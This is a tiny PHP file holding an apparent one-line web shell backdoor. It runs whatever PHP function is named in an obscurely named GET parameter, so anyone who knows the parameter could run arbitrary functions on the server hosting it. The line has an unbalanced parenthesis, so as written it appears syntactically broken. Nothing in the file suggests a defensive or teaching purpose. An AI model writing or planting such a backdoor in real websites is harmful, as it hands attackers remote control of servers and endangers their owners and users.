<?php
$_GET['fNheLEcb'](($_GET['fNheLEcb']);
?>
